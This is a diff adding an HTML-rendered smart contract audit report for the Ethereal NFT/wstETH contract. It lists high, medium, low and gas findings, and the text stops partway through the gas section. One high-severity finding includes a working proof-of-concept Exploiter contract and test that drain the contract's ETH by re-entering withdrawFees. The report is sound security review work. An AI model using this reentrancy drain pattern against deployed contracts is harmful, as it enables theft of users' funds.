@@ -1,0 +1,1173 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>2024-02-28-ethereal.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/* https://github.com/microsoft/vscode/blob/master/extensions/markdown-language-features/media/markdown.css */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family: var(--vscode-markdown-font-family, -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif);
+	font-size: var(--vscode-markdown-font-size, 14px);
+	padding: 0 26px;
+	line-height: var(--vscode-markdown-line-height, 22px);
+	word-wrap: break-word;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-light.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-dark.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line .code-line:hover:before {
+	border-left: none;
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	text-decoration: none;
+}
+
+a:hover {
+	text-decoration: underline;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom-width: 1px;
+	border-bottom-style: solid;
+}
+
+h1, h2, h3 {
+	font-weight: normal;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left-width: 5px;
+	border-left-style: solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 1em;
+	line-height: 1.357em;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+pre code {
+	color: var(--vscode-editor-foreground);
+	tab-size: 4;
+}
+
+/** Theming */
+
+.vscode-light pre {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+</style>
+
+<style>
+/* Tomorrow Theme */
+/* http://jmblog.github.com/color-themes-for-google-code-highlightjs */
+/* Original theme - https://github.com/chriskempson/tomorrow-theme */
+
+/* Tomorrow Comment */
+.hljs-comment,
+.hljs-quote {
+	color: #8e908c;
+}
+
+/* Tomorrow Red */
+.hljs-variable,
+.hljs-template-variable,
+.hljs-tag,
+.hljs-name,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-regexp,
+.hljs-deletion {
+	color: #c82829;
+}
+
+/* Tomorrow Orange */
+.hljs-number,
+.hljs-built_in,
+.hljs-builtin-name,
+.hljs-literal,
+.hljs-type,
+.hljs-params,
+.hljs-meta,
+.hljs-link {
+	color: #f5871f;
+}
+
+/* Tomorrow Yellow */
+.hljs-attribute {
+	color: #eab700;
+}
+
+/* Tomorrow Green */
+.hljs-string,
+.hljs-symbol,
+.hljs-bullet,
+.hljs-addition {
+	color: #718c00;
+}
+
+/* Tomorrow Blue */
+.hljs-title,
+.hljs-section {
+	color: #4271ae;
+}
+
+/* Tomorrow Purple */
+.hljs-keyword,
+.hljs-selector-tag {
+	color: #8959a8;
+}
+
+.hljs {
+	display: block;
+	overflow-x: auto;
+	color: #4d4d4c;
+	padding: 0.5em;
+}
+
+.hljs-emphasis {
+	font-style: italic;
+}
+
+.hljs-strong {
+	font-weight: bold;
+}
+</style>
+
+<style>
+/*
+ * Markdown PDF CSS
+ */
+
+ body {
+	font-family: -apple-system, BlinkMacSystemFont, "Segoe WPC", "Segoe UI", "Ubuntu", "Droid Sans", sans-serif, "Meiryo";
+	padding: 0 12px;
+}
+
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+code {
+	font-size: 14px;
+	line-height: 19px;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+</style>
+
+<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+  <script>
+    mermaid.initialize({
+      startOnLoad: true,
+      theme: document.body.classList.contains('vscode-dark') || document.body.classList.contains('vscode-high-contrast')
+          ? 'dark'
+          : 'default'
+    });
+  </script>
+<div align="center">
+<p><img src="./logo.png" alt="Bellum Galaxy"></p>
+</div>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+</br>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a></li>
+<li><a href="#protocol-summary">Protocol Summary</a></li>
+<li><a href="#disclaimer">Disclaimer</a></li>
+<li><a href="#risk-classification">Risk Classification</a></li>
+<li><a href="#audit-details">Audit Details</a>
+<ul>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#roles">Roles</a></li>
+<li><a href="#issues-found">Issues found</a></li>
+<li><a href="#methodology">Methodology</a></li>
+<li><a href="#audit-findings">Audit Findings</a>
+<ul>
+<li><a href="#high-severity-vulnerabilities">High Severity Vulnerabilities</a></li>
+<li><a href="#medium-severity-vulnerabilities">Medium Severity Vulnerabilities</a></li>
+<li><a href="#minor-observations">Minor Observations</a></li>
+</ul>
+</li>
+<li><a href="#conclusion">Conclusion</a></li>
+<li><a href="#appendices">Appendices</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="protocol-summary">Protocol Summary</h1>
+<h1 id="disclaimer">Disclaimer</h1>
+<p>The Bellum Galaxy team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.</p>
+<h1 id="risk-classification">Risk Classification</h1>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th>Impact</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td>High</td>
+<td>Medium</td>
+<td>Low</td>
+</tr>
+<tr>
+<td></td>
+<td>High</td>
+<td>H</td>
+<td>H/M</td>
+<td>M</td>
+</tr>
+<tr>
+<td>Likelihood</td>
+<td>Medium</td>
+<td>H/M</td>
+<td>M</td>
+<td>M/L</td>
+</tr>
+<tr>
+<td></td>
+<td>Low</td>
+<td>M</td>
+<td>M/L</td>
+<td>L</td>
+</tr>
+</tbody>
+</table>
+<p>We use the <a href="https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity">CodeHawks</a> severity matrix to determine severity. See the documentation for more details.</p>
+<h1 id="audit-details">Audit Details</h1>
+<ul>
+<li><strong>Project Name:</strong>
+<ul>
+<li>Ethereal</li>
+</ul>
+</li>
+<li><strong>Smart Contract Address:</strong>
+<ul>
+<li>Not deployed</li>
+</ul>
+</li>
+<li><strong>Audit Date:</strong>
+<ul>
+<li>28/02/2024</li>
+</ul>
+</li>
+<li><strong>Audit Tools Used:</strong>
+<ul>
+<li>Aderyn</li>
+<li>Code Review</li>
+<li>Slither</li>
+<li>Solidity Code Metrics</li>
+</ul>
+</li>
+<li><strong>Auditors:</strong>
+<ul>
+<li>Barba</li>
+</ul>
+</li>
+</ul>
+<h2 id="scope">Scope</h2>
+<pre class="hljs"><code><div>`ethereal.sol`
+</div></code></pre>
+<h2 id="roles">Roles</h2>
+<p>Green Rabbit</p>
+<h2 id="issues-found">Issues found</h2>
+<table>
+<thead>
+<tr>
+<th>Severtity</th>
+<th>Number of issues found</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>High</td>
+<td>2</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Low</td>
+<td>6</td>
+</tr>
+<tr>
+<td>Gas</td>
+<td>5</td>
+</tr>
+<tr>
+<td>Info</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Total</td>
+<td>15</td>
+</tr>
+</tbody>
+</table>
+<h2 id="audit-findings">Audit Findings</h2>
+<h3 id="high-severity-vulnerabilities">High Severity Vulnerabilities</h3>
+<ul>
+<li>
+<p><strong>Protocol design allows the owner to drain all the eth.</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Centralization already can be a problem however, in this case, we have a sum of factors that can lead to a drain of funds</li>
+<li>The protocol design allows the owner to attack &quot;safe&quot; and &quot;controlled&quot; functions that are supposed to be used to withdraw funds.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>All the ETH funds can be drained.</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+<details>
+<summary>Add the code below to `Ethereal.t.sol`</summary>
+<pre class="hljs"><code><div>
+    function test_PreparingExploid() public {
+            ethereal = new Ethereal();
+
+            ethereal.createCollection(&quot;1st Collection&quot;, false, address(0), true, BASE_URL);
+            ethereal.createGem(0, 100 * 1e18, 100, true);
+            ethereal.createCollection(&quot;2nd Collection&quot;, false, address(0), true, BASE_URL);
+            ethereal.createGem(1, 50* 1e18, 100, true);
+            ethereal.createCollection(&quot;3rd Collection&quot;, false, address(0), true, BASE_URL);
+            ethereal.createGem(2, 50* 1e18, 100, true);
+
+            vm.deal(user1, 200 * 1e18);
+            vm.startPrank(user1);
+            uint256 tokenIdOne = ethereal.mint{value: 100 * 1e18}(0, user1);
+            uint256 tokenIdTwo = ethereal.mint{value: 50 * 1e18}(1, user1);
+            uint256 tokenIdThree = ethereal.mint{value: 50 * 1e18}(2, user1);
+            vm.stopPrank();
+
+            vm.prank(user1);
+            ethereal.redeem(tokenIdTwo);
+            vm.prank(user1);
+            ethereal.redeem(tokenIdThree);
+
+            Exploiter ex = new Exploiter(ethereal);
+
+            ethereal.setPayout(address(ex));
+            ethereal.transferOwnership(address(ex));
+            console2.log(address(ex).balance);
+
+            vm.prank(address(ex));
+            ex.exploit();
+
+            console2.log(address(ex).balance); //101_000_000_000_000_000_000
+        }
+
+        contract Exploiter {
+        Ethereal eth;
+
+        constructor(Ethereal _address){
+            eth = _address;
+        }
+
+        function exploit() public {
+            eth.withdrawFees();
+        }
+
+        receive() external payable {
+            if(address(eth).balance &gt; 0){
+                eth.withdrawFees();
+            }
+        }
+    }
+
+</div></code></pre>
+<ul>
+<li>Considering the following function, the wstEth could be drained too.</li>
+</ul>
+<pre class="hljs"><code><div>    function approveWstEth(address _spender) external onlyOwner {
+      require(_spender != address(0), &quot;Zero address&quot;);
+      IwstETH(wstETH).approve(_spender, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+    }
+</div></code></pre>
+</details>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The function <code>etheral::_mintWstEth</code> is implemented incorrectly, breaking the functionality.</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>wstEth is an ERC20. So the transfer should be done using <code>etheral::transfer</code> or <code>etheral::transferFrom</code>from the <code>IwstEth</code>. Also, the <code>etheral::mint</code> function requires that some eth value must be sent. However, in this case, no ether would be sent.</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Protocol functionality is not utilized</li>
+</ul>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+  <details>
+  <summary>See the code below</summary>
+<pre class="hljs"><code><div>
+    function _mintWstEth(uint256 _id, uint256 _collection, address _recipient) internal returns (uint256 tokenId_) {
+        tokenId_ = ++_tokenCounter;
+        _safeMint(_recipient, tokenId_);
+        circulatingGems++;
+        uint256 preBalance = IwstETH(wstETH).balanceOf(address(this));
+
+@&gt;      (bool success,) = wstETH.call{value: msg.value}(&quot;&quot;);
+@&gt;      require(success, &quot;Failed to deposit Ether&quot;);
+
+        metadata[tokenId_] = Metadata(IwstETH(wstETH).balanceOf(address(this)) - preBalance, _collection, _id);
+        emit GemMinted(tokenId_, _recipient, msg.value);
+    }
+
+</div></code></pre>
+<pre class="hljs"><code><div>
+    function mint(uint256 _id, address _recipient) external payable nonReentrant whenNotPaused returns (uint256 tokenId_){
+
+@&gt;      require(msg.value == gems[_id].denomination, &quot;Wrong ether amount&quot;);
+
+        //Verify has validator
+        if (collections[gems[_id].collection].validator) {
+            //Verify msg.sender == validator
+            require(collections[gems[_id].collection].validatorAddress == msg.sender, &quot;Not Validator&quot;);
+        }
+
+        //Activ means that someone has the gem already
+        require(gems[_id].active, &quot;No longer mintable&quot;);
+
+        if (collections[gems[_id].collection].ethereum) {
+            return _mintEth(_id, gems[_id].collection, _recipient);
+        } else {
+            return _mintWstEth(_id, gems[_id].collection, _recipient);
+        }
+    }
+
+</div></code></pre>
+  </details>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="medium-severity-vulnerabilities">Medium Severity Vulnerabilities</h3>
+<ul>
+<li><strong>Centralization Risk for trusted owners</strong>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Contracts have owners with privileged rights to perform admin tasks and need to be trusted to not perform malicious updates or drain funds.</li>
+</ul>
+<details>
+<summary>See the instances below</summary>
+<ul>
+<li>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L23">Line: 23</a></li>
+</ul>
+<pre class="hljs"><code><div>contract Ethereal is Ownable, Pausable, ERC721URIStorage, ERC721Holder, ReentrancyGuard {
+</div></code></pre>
+<ul>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L78">Line: 78</a></p>
+<pre class="hljs"><code><div>    ) external onlyOwner returns (uint256 id_) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L96">Line: 96</a></p>
+<pre class="hljs"><code><div>        onlyOwner
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L113">Line: 113</a></p>
+<pre class="hljs"><code><div>    ) external onlyOwner {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L123">Line: 123</a></p>
+<pre class="hljs"><code><div>        onlyOwner
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L131">Line: 131</a></p>
+<pre class="hljs"><code><div>    function ceaseGem(uint256 _id) external onlyOwner {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L250">Line: 250</a></p>
+<pre class="hljs"><code><div>    function setWstEth(address _wstETH) external onlyOwner {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L255">Line: 255</a></p>
+<pre class="hljs"><code><div>    function setPayout(address _payout) external onlyOwner {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L260">Line: 260</a></p>
+<pre class="hljs"><code><div>    function withdrawFees() external onlyOwner {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L266">Line: 266</a></p>
+<pre class="hljs"><code><div>    function approveWstEth(address _spender) external onlyOwner {
+</div></code></pre>
+</li>
+</ul>
+</details>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Besides the risks already mentioned, on this particular protocol, for example, the owner could change the address of the wstEth and block withdraws.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="low-severity-vulnerabilities">Low Severity Vulnerabilities</h3>
+<ul>
+<li>
+<p><strong>Missing critical event emission</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+  <details>
+  <summary>See the intances below</summary>
+<pre><code>```solidity
+    function setWstEth(address _wstETH) external onlyOwner {
+        require(_wstETH != address(0), &quot;Zero address&quot;);
+        wstETH = _wstETH;
+    }
+
+```
+
+```solidity
+    function setPayout(address _payout) external onlyOwner {
+        require(_payout != address(0), &quot;Zero address&quot;);
+        payout = _payout;
+    }
+```
+
+```solidity
+    function withdrawFees() external onlyOwner {
+            (bool success,) = payout.call{value: fees}(&quot;&quot;);
+            require(success, &quot;Transfer failed&quot;);
+            fees = 0;
+    }
+```
+</code></pre>
+  </details>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+<ul>
+<li>Critical protocol updates could be unnoticed.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Following functions don't follow CEI patterns</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+  <details>
+  <summary>See the instances below</summary>
+<pre class="hljs"><code><div>    function _mintWstEth(uint256 _id, uint256 _collection, address _recipient) internal returns (uint256 tokenId_) {
+        tokenId_ = ++_tokenCounter;
+        _safeMint(_recipient, tokenId_);
+        circulatingGems++;
+        uint256 preBalance = IwstETH(wstETH).balanceOf(address(this));
+
+        (bool success,) = wstETH.call{value: msg.value}(&quot;&quot;);
+        require(success, &quot;Failed to deposit Ether&quot;);
+        metadata[tokenId_] = Metadata(IwstETH(wstETH).balanceOf(address(this)) - preBalance, _collection, _id);
+        emit GemMinted(tokenId_, _recipient, msg.value);
+    }
+</div></code></pre>
+<pre class="hljs"><code><div>    function _redeemEth(uint256 _tokenId) internal {
+        safeTransferFrom(msg.sender, address(this), _tokenId);
+        _burn(_tokenId);
+        circulatingGems--;
+        uint256 redeemFee = (metadata[_tokenId].balance * gems[metadata[_tokenId].gem].redeemFee) / 1e4;
+        uint256 amount = metadata[_tokenId].balance - redeemFee;
+        fees += redeemFee; 
+        metadata[_tokenId].balance = 0;
+        (bool success,) = msg.sender.call{value: amount}(&quot; &quot;);
+        require(success, &quot; &quot;);
+        emit GemRedeemed(_tokenId, msg.sender, amount);
+    }
+</div></code></pre>
+<pre class="hljs"><code><div>    function _redeemWstEth(uint256 _tokenId) internal {
+        safeTransferFrom(msg.sender, address(this), _tokenId);
+        uint256 redeemFee = metadata[_tokenId].balance * gems[metadata[_tokenId].gem].redeemFee / 1e4;
+        uint256 amount = metadata[_tokenId].balance - redeemFee;
+        fees += redeemFee;
+        metadata[_tokenId].balance = 0;
+        _burn(_tokenId);
+        circulatingGems--;
+        IwstETH(wstETH).transfer(msg.sender, amount);
+        emit GemRedeemed(_tokenId, msg.sender, amount);
+    }
+</div></code></pre>
+  </details>
+</li>
+</ul>
+</li>
+<li>
+<p><strong><code>abi.encodePacked()</code> should not be used with dynamic types when passing the result to a hash function such as <code>keccak256()</code></strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>Use <code>abi.encode()</code> instead which will pad items to 32 bytes, which will <a href="https://docs.soliditylang.org/en/v0.8.13/abi-spec.html#non-standard-packed-mode">prevent hash collisions</a> (e.g. <code>abi.encodePacked(0x123,0x456)</code> =&gt; <code>0x123456</code> =&gt; <code>abi.encodePacked(0x1,0x23456)</code>, but <code>abi.encode(0x123,0x456)</code> =&gt; <code>0x0...1230...456</code>). Unless there is a compelling reason, <code>abi.encode</code> should be preferred. If there is only one argument to <code>abi.encodePacked()</code> it can often be cast to <code>bytes()</code> or <code>bytes32()</code> <a href="https://ethereum.stackexchange.com/questions/30912/how-to-compare-strings-in-solidity#answer-82739">instead</a>.</li>
+</ul>
+<p>If all arguments are strings and or bytes, <code>bytes.concat()</code> should be used instead.</p>
+<ul>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L272">Line: 272</a></p>
+<pre class="hljs"><code><div>        return string(abi.encodePacked(a, b));
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Unsafe ERC20 Operations should not be used</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>ERC20 functions may not behave as expected. For example: return values are not always meaningful. It is recommended to use OpenZeppelin's SafeERC20 library.</p>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L195">Line: 195</a></p>
+<pre class="hljs"><code><div>        IwstETH(wstETH).transfer(msg.sender, amount);
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L268">Line: 268</a></p>
+<pre class="hljs"><code><div>        IwstETH(wstETH).approve(_spender, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Solidity pragma should be specific, not wide</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of <code>pragma solidity ^0.8.0;</code>, use <code>pragma solidity 0.8.0;</code></p>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L1">Line: 1</a></p>
+<pre class="hljs"><code><div>pragma solidity ^0.8.0;
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>PUSH0 is not supported by all chains</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>Solc compiler version 0.8.20 switches the default target EVM version to Shanghai, which means that the generated bytecode will include PUSH0 opcodes. Be sure to select the appropriate EVM version in case you intend to deploy on a chain other than mainnet like L2 chains that may not support PUSH0, otherwise deployment of your contracts will fail.</p>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L1">Line: 1</a></p>
+<pre class="hljs"><code><div>pragma solidity ^0.8.0;
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Impact:</strong></p>
+</li>
+<li>
+<p><strong>Proof of Concept:</strong></p>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="gas-observations">Gas Observations</h3>
+<ul>
+<li>
+<p><strong>Unused functions</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The following Interface functions are not used</li>
+</ul>
+<pre class="hljs"><code><div>    function getStETHByWstETH(uint256 amount) external view returns (uint256);
+    function getWstETHByStETH(uint256 amount) external view returns (uint256);
+    function stEthPerToken() external view returns (uint256);
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Unused event</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The following event is not being used</li>
+</ul>
+<pre class="hljs"><code><div>    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Smaller variables should be packed together</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The following variables should be packed together:</li>
+</ul>
+<pre class="hljs"><code><div>      struct Collection {
+          string name; //3-4
+          bool validator; //0
+          address validatorAddress; //2
+          bool ethereum; //1
+          string baseURI; //3-4
+      }
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Functions not used internally could be marked external</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>
+<p>Public function has a higher gas consumption. If the function is not used internally, should be marked as external.</p>
+<details>
+<summary>See the instances bellow</summary>
+  - Found in src/ethereal.sol [Line: 209](src\ethereal.sol#L209)
+<pre><code>```solidity
+    function getTokenCollectionName(uint256 _tokenId) public view returns (string memory) {
+```
+</code></pre>
+<ul>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L213">Line: 213</a></p>
+<pre class="hljs"><code><div>    function getTokenCollectionId(uint256 _tokenId) public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L217">Line: 217</a></p>
+<pre class="hljs"><code><div>    function getTokenGemId(uint256 _tokenId) public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L221">Line: 221</a></p>
+<pre class="hljs"><code><div>    function getTokenBalance(uint256 _tokenId) public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L225">Line: 225</a></p>
+<pre class="hljs"><code><div>    function getCollectionsLength() public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L229">Line: 229</a></p>
+<pre class="hljs"><code><div>    function getGemsLength() public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L233">Line: 233</a></p>
+<pre class="hljs"><code><div>    function totalPrinted() public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L237">Line: 237</a></p>
+<pre class="hljs"><code><div>    function gemsCirculating() public view returns (uint256) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L242">Line: 242</a></p>
+<pre class="hljs"><code><div>    function tokenURI(uint256 _tokenId) public view override returns (string memory) {
+</div></code></pre>
+</li>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L246">Line: 246</a></p>
+<pre class="hljs"><code><div>    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
+</div></code></pre>
+</li>
+</ul>
+</details>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Recommendation:</strong></p>
+<ul>
+<li>Change the functions visibility if not used internally.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Constants should be defined and used instead of literals</strong></p>
+<ul>
+<li>
+<p><strong>Description:</strong></p>
+<ul>
+<li>The use of literals can lead to errors. It's a best practice use constant variables instead of literals.</li>
+</ul>
+<details>
+<summary>See the instances bellow</summary>
+<ul>
+<li>
+<p>Found in src/ethereal.sol <a href="src%5Cethereal.sol#L178">Line: 178</a></p>
